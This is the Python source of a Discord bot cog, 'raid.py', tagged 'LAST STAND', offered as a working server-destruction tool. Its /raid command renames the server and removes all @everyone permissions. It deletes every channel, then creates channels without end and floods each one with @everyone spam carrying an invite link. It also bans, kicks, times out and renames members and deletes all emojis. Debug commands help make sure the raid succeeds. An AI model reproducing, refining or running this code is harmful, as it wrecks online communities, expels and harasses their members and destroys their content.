"""
raid.py — LAST STAND | Raw destruction engine.

DEBUGGING NOTE:
  If channel creation still fails after this rewrite, run /testperms and
  /testcreate BEFORE running /raid. Those commands will show you the EXACT
  error in Discord — no Railway log needed. Look at what they return.

ARCHITECTURE:
  _channel_loop is now SEQUENTIAL, not concurrent. One delete at a time,
  one create at a time. This removes ALL possible async coordination bugs.
  Every single error is caught and printed. The loop can NEVER die silently.
"""

import asyncio
import datetime
import random
import string

import discord
from discord import app_commands
from discord.ext import commands

from utils.state import bot_state

RAID_TAG  = "LAST STAND"
RAID_LINK = "https://discord.gg/s59zWvzK6c"
RAID_NAME = f"RAIDED BY {RAID_TAG}"

# Max concurrent channel.send calls across ALL spam tasks.
# Keeps the event loop free so interactions still respond in time.
_SPAM_SEM = asyncio.Semaphore(30)

_MSGS = [
    f"@everyone 💀 **RAIDED BY {RAID_TAG}** 💀 {RAID_LINK}",
    f"@everyone ☠️ LAST STAND WAS HERE ☠️ {RAID_LINK}",
    f"@everyone 🔥 YOUR SERVER HAS BEEN RAIDED 🔥 {RAID_LINK}",
    f"@everyone ⚔️ LAST STAND RAID ⚔️ {RAID_LINK}",
    f"@everyone 💥 OBLITERATED BY LAST STAND 💥 {RAID_LINK}",
    f"@everyone 👑 LAST STAND OWNS THIS SERVER {RAID_LINK}",
    f"@here 💀 RAIDED BY LAST STAND {RAID_LINK}",
    f"@here ☠️ LAST STAND RAID IN PROGRESS {RAID_LINK}",
]

_WH_NAMES = [
    "Server Announcement", "Mod Alert", "AutoMod",
    "Carl-bot", "MEE6", "Wick",
    "LSC Alpha", "LSC Reaper", "LSC Ghost",
]

_NICKS = ["RAIDED", "LSC Was Here", "GG no re", "PWNED", RAID_TAG]


def _rand(n: int = 4) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _ch_name(i: int = 0) -> str:
    opts = [
        f"raided-by-lsc-{i}",
        f"last-stand-{i}",
        f"lsc-owned-{i}",
        f"lsc-raid-{i}",
        f"last-stand-here-{i}",
    ]
    return random.choice(opts)


def _msg() -> str:
    return random.choice(_MSGS)


class Raid(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    # ─────────────────────────────────────────────────────────────────────────
    # /testperms — run THIS first to verify bot has correct permissions
    # ─────────────────────────────────────────────────────────────────────────
    @app_commands.command(
        name="testperms",
        description="Check what permissions the bot has in this server."
    )
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def testperms(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer(ephemeral=True)
        guild = interaction.guild
        me    = guild.me
        p     = me.guild_permissions

        lines = [
            f"**Bot permission check — {guild.name}**",
            f"Administrator    : {'✅' if p.administrator else '❌'}",
            f"Manage Guild     : {'✅' if p.manage_guild else '❌'}",
            f"Manage Channels  : {'✅' if p.manage_channels else '❌'}",
            f"Manage Roles     : {'✅' if p.manage_roles else '❌'}",
            f"Manage Webhooks  : {'✅' if p.manage_webhooks else '❌'}",
            f"Ban Members      : {'✅' if p.ban_members else '❌'}",
            f"Kick Members     : {'✅' if p.kick_members else '❌'}",
            f"Moderate Members : {'✅' if p.moderate_members else '❌'}",
            f"",
            f"Bot top role     : `{me.top_role.name}` (pos {me.top_role.position})",
            f"",
            f"**If Manage Channels is ❌ — channel creation will never work.**",
            f"Go to Server Settings → Roles → bot role → enable Manage Channels.",
        ]
        await interaction.followup.send("\n".join(lines), ephemeral=True)

    # ─────────────────────────────────────────────────────────────────────────
    # /testcreate — run THIS to see the exact error from channel creation
    # ─────────────────────────────────────────────────────────────────────────
    @app_commands.command(
        name="testcreate",
        description="Try to create one test channel and report success or exact error."
    )
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def testcreate(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer(ephemeral=True)
        guild = interaction.guild
        try:
            ch = await asyncio.wait_for(
                guild.create_text_channel("lsc-test-channel"),
                timeout=15.0,
            )
            await interaction.followup.send(
                f"✅ **Channel creation WORKS.**\n"
                f"Created: <#{ch.id}>\n\n"
                f"Channel creation is functional. The raid loop should work.\n"
                f"Run `/raid` now.",
                ephemeral=True,
            )
            try:
                await ch.delete()
            except Exception:
                pass
        except asyncio.TimeoutError:
            await interaction.followup.send(
                f"❌ **TIMEOUT — create_text_channel hung for 15 seconds and never returned.**\n\n"
                f"This means Discord is not responding to channel create requests.\n"
                f"Possible causes:\n"
                f"• Guild hit the 500-channel cap (check Server Settings → Channels)\n"
                f"• Discord is rate-limiting this guild at the API level (wait 10–15 min)\n"
                f"• Bot lost its connection mid-request (redeploy on Railway)\n\n"
                f"Check Railway logs for `[raid]` lines for more detail.",
                ephemeral=True,
            )
        except discord.Forbidden as e:
            await interaction.followup.send(
                f"❌ **403 FORBIDDEN — bot cannot create channels.**\n"
                f"Error: `{e}`\n\n"
                f"**Fix:** Server Settings → Roles → bot's role → turn ON **Manage Channels**.",
                ephemeral=True,
            )
        except discord.HTTPException as e:
            await interaction.followup.send(
                f"❌ **HTTP {e.status} error creating channel.**\n"
                f"Code: `{e.code}` — Text: `{e.text}`\n\n"
                f"This is a Discord API error. Status {e.status}.",
                ephemeral=True,
            )
        except Exception as e:
            await interaction.followup.send(
                f"❌ **Unknown error:** `{type(e).__name__}: {e}`",
                ephemeral=True,
            )

    # ── shared launch ──────────────────────────────────────────────────────────
    async def _launch(self, guild: discord.Guild, invoker_id: int, reply) -> None:
        if bot_state.active_simulation:
            await reply(f"⚠️ **{bot_state.active_simulation}** is running — use `.stop` or `/stop` first.")
            return

        # Check create permission before committing
        if not guild.me.guild_permissions.manage_channels and not guild.me.guild_permissions.administrator:
            await reply(
                "❌ Bot is missing **Manage Channels** permission — channel flood won't work.\n"
                "Run `/testperms` to see all permission issues."
            )
            return

        bot_state.reset()
        bot_state.active_simulation = "raid"

        try:
            await reply(
                f"☠️ **{RAID_TAG} — RAID LAUNCHED** ☠️\n"
                f"Sequential delete → sequential channel flood → ban/kick → spam\n"
                f"Check Railway logs or run `/status` to see progress.\n"
                f"Use `.stop` or `/stop` to halt."
            )
        except Exception:
            pass

        bot_state.add_task(asyncio.create_task(self._rename_server(guild)))
        bot_state.add_task(asyncio.create_task(self._channel_loop(guild)))
        bot_state.add_task(asyncio.create_task(self._member_ops(guild, invoker_id)))
        bot_state.add_task(asyncio.create_task(self._wipe_emojis(guild)))

    # ── /raid ──────────────────────────────────────────────────────────────────
    @app_commands.command(name="raid", description=f"☠️ Full destruction — {RAID_TAG}. Runs until /stop.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def raid(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer()
        await self._launch(interaction.guild, interaction.user.id, interaction.followup.send)

    # ── .raid ──────────────────────────────────────────────────────────────────
    @commands.command(name="raid")
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def raid_prefix(self, ctx: commands.Context) -> None:
        await self._launch(ctx.guild, ctx.author.id, ctx.send)

    # ─────────────────────────────────────────────────────────────────────────
    # RENAME SERVER
    # ─────────────────────────────────────────────────────────────────────────
    async def _rename_server(self, guild: discord.Guild) -> None:
        try:
            await guild.edit(name=RAID_NAME)
            print(f"[raid] server renamed OK", flush=True)
        except Exception as e:
            print(f"[raid] rename FAILED: {type(e).__name__}: {e}", flush=True)

        try:
            await guild.default_role.edit(permissions=discord.Permissions.none())
            print("[raid] @everyone locked OK", flush=True)
        except Exception as e:
            print(f"[raid] lock @everyone FAILED: {type(e).__name__}: {e}", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # CHANNEL LOOP — fully sequential, every error logged
    #
    # Sequential on purpose. Concurrent gather was hiding errors because
    # asyncio.gather(return_exceptions=True) swallowed all of them.
    # Now every delete and every create is individually awaited and logged.
    # ─────────────────────────────────────────────────────────────────────────
    async def _channel_loop(self, guild: discord.Guild) -> None:
        se = bot_state.stop_event

        try:
            # ── Step 1: delete all existing channels one by one ───────────────
            existing = list(guild.channels)
            print(f"[raid] deleting {len(existing)} channels...", flush=True)

            for ch in existing:
                if se.is_set():
                    return
                try:
                    await ch.delete()
                except discord.NotFound:
                    pass
                except discord.Forbidden:
                    print(f"[raid] 403 deleting #{ch.name}", flush=True)
                except discord.HTTPException as e:
                    print(f"[raid] HTTP {e.status} deleting #{ch.name}: {e.text}", flush=True)
                    if e.status == 429:
                        await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
                except Exception as e:
                    print(f"[raid] error deleting #{ch.name}: {type(e).__name__}: {e}", flush=True)

            print("[raid] delete done — starting channel create loop", flush=True)

            # ── Step 2: create channels one by one ───────────────────────────
            count = 0
            while not se.is_set():
                name = _ch_name(count)
                try:
                    ch = await asyncio.wait_for(
                        guild.create_text_channel(
                            name,
                            topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
                        ),
                        timeout=15.0,
                    )
                    print(f"[raid] created #{name} ({count})", flush=True)
                    count += 1
                    bot_state.add_task(asyncio.create_task(self._spam_channel(ch)))

                except asyncio.TimeoutError:
                    print(f"[raid] TIMEOUT creating #{name} — Discord not responding. Sleeping 5s.", flush=True)
                    await asyncio.sleep(5.0)

                except discord.Forbidden as e:
                    print(f"[raid] 403 creating channel — MISSING Manage Channels PERMISSION: {e}", flush=True)
                    await asyncio.sleep(2.0)

                except discord.HTTPException as e:
                    print(f"[raid] HTTP {e.status} creating #{name}: code={e.code} text={e.text}", flush=True)
                    if e.status == 429:
                        wait = float(getattr(e, "retry_after", 1.0))
                        print(f"[raid] rate limited — sleeping {wait:.1f}s", flush=True)
                        await asyncio.sleep(wait)
                    else:
                        await asyncio.sleep(1.0)

                except Exception as e:
                    print(f"[raid] UNEXPECTED create error: {type(e).__name__}: {e}", flush=True)
                    await asyncio.sleep(1.0)

        except asyncio.CancelledError:
            print("[raid] channel_loop cancelled", flush=True)
        except Exception as e:
            # This catches anything that could crash the loop itself
            print(f"[raid] channel_loop OUTER CRASH: {type(e).__name__}: {e}", flush=True)
        finally:
            print("[raid] channel_loop exiting", flush=True)
            if bot_state.active_simulation == "raid":
                bot_state.active_simulation = None

    # ─────────────────────────────────────────────────────────────────────────
    # WEBHOOK SPAM
    # ─────────────────────────────────────────────────────────────────────────
    async def _spam_channel(self, channel: discord.TextChannel) -> None:
        """
        Spam a single channel with direct channel.send calls.
        No webhook creation — webhook creation was the bottleneck that left
        most channels silent. This starts instantly on every channel.
        Global _SPAM_SEM caps concurrent sends so the event loop stays
        responsive and interactions don't get "application did not respond".
        """
        se = bot_state.stop_event
        mentions = discord.AllowedMentions(everyone=True, roles=True)

        while not se.is_set():
            async with _SPAM_SEM:
                if se.is_set():
                    return
                try:
                    await channel.send(_msg(), allowed_mentions=mentions)
                except (discord.NotFound, discord.Forbidden):
                    return
                except discord.HTTPException as e:
                    if e.status == 429:
                        await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
                except Exception:
                    return

    # ─────────────────────────────────────────────────────────────────────────
    # MEMBER OPS
    # ─────────────────────────────────────────────────────────────────────────
    async def _member_ops(self, guild: discord.Guild, invoker_id: int) -> None:
        se = bot_state.stop_event
        print("[raid] member_ops: chunking...", flush=True)

        try:
            await asyncio.wait_for(guild.chunk(cache=True), timeout=10.0)
        except Exception as e:
            print(f"[raid] chunk error: {e}", flush=True)

        if se.is_set():
            return

        me = guild.me
        targets = [
            m for m in guild.members
            if not m.bot
            and m.id != invoker_id
            and m.id != me.id
            and m.top_role < me.top_role
        ]
        print(f"[raid] banning/kicking {len(targets)} members", flush=True)

        sem  = asyncio.Semaphore(25)
        dur  = datetime.timedelta(days=28)

        async def _ban(m):
            async with sem:
                try:
                    await guild.ban(m, reason=f"Raided by {RAID_TAG}", delete_message_days=0)
                except Exception:
                    pass

        async def _kick(m):
            async with sem:
                try:
                    await guild.kick(m, reason=f"Raided by {RAID_TAG}")
                except Exception:
                    pass

        async def _timeout(m):
            async with sem:
                try:
                    await m.timeout(dur, reason=f"Raided by {RAID_TAG}")
                except Exception:
                    pass

        async def _nick(m):
            async with sem:
                try:
                    await m.edit(nick=random.choice(_NICKS))
                except Exception:
                    pass

        await asyncio.gather(
            *[_ban(m) for m in targets],
            *[_kick(m) for m in targets],
            *[_timeout(m) for m in targets],
            *[_nick(m) for m in targets],
            return_exceptions=True,
        )
        print(f"[raid] member_ops done", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # EMOJI WIPE
    # ─────────────────────────────────────────────────────────────────────────
    async def _wipe_emojis(self, guild: discord.Guild) -> None:
        for e in list(guild.emojis):
            try:
                await e.delete()
            except Exception:
                pass

    # ── error handlers ─────────────────────────────────────────────────────────
    @raid.error
    async def raid_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        msg = "❌ You need **Administrator** permission." if isinstance(error, app_commands.MissingPermissions) else f"❌ {error}"
        try:
            if interaction.response.is_done():
                await interaction.followup.send(msg, ephemeral=True)
            else:
                await interaction.response.send_message(msg, ephemeral=True)
        except Exception:
            pass

    @testperms.error
    @testcreate.error
    async def test_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        try:
            await interaction.response.send_message(f"❌ {error}", ephemeral=True)
        except Exception:
            pass


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Raid(bot))
